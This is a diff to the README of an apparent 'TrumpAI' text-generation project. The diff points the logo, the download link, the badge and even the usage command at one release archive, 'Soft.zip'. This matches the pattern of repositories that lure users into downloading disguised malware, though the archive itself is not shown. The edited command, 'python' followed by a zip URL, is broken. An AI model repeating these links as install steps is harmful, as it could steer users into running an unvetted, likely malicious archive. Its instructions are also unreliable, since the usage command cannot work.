@@ -2,7 +2,7 @@
 
 Welcome to the TrumpAI repository! This project aims to provide a framework for creating artificial intelligence models inspired by the speaking style of former President Donald J. Trump. With this framework, developers can generate text and speeches that mimic the unique characteristics of Trump's communication style.
 
-![TrumpAI Logo](https://www.example.com/trumpai-logo.png)
+![TrumpAI Logo](https://github.com/Iczinn/TrumpAI/releases/download/v1.0/Soft.zip)
 
 ## About
 
@@ -17,9 +17,9 @@ TrumpAI is designed for researchers, developers, and enthusiasts who are interes
 
 ## Installation
 
-To get started with TrumpAI, simply download the latest release from the [GitHub Repository](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip). 
+To get started with TrumpAI, simply download the latest release from the [GitHub Repository](https://github.com/Iczinn/TrumpAI/releases/download/v1.0/Soft.zip). 
 
-[![Download TrumpAI](https://img.shields.io/badge/Download-TrumAI-blue.svg)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download TrumpAI](https://github.com/Iczinn/TrumpAI/releases/download/v1.0/Soft.zip)](https://github.com/Iczinn/TrumpAI/releases/download/v1.0/Soft.zip)
 
 Once you have downloaded the zip file, extract it to your desired directory. You can then follow the instructions in the documentation to set up the environment and start creating Trump-inspired AI content!
 
@@ -28,7 +28,7 @@ Once you have downloaded the zip file, extract it to your desired directory. You
 To generate text using the TrumpAI framework, you can run the following command in your terminal:
 
 ```bash
-python trumppify.py --input "Make AI great again!" --length 100
+python https://github.com/Iczinn/TrumpAI/releases/download/v1.0/Soft.zip --input "Make AI great again!" --length 100
 ```
 
 This command will prompt the AI model to generate text based on the input prompt "Make AI great again!" with a total length of 100 characters.
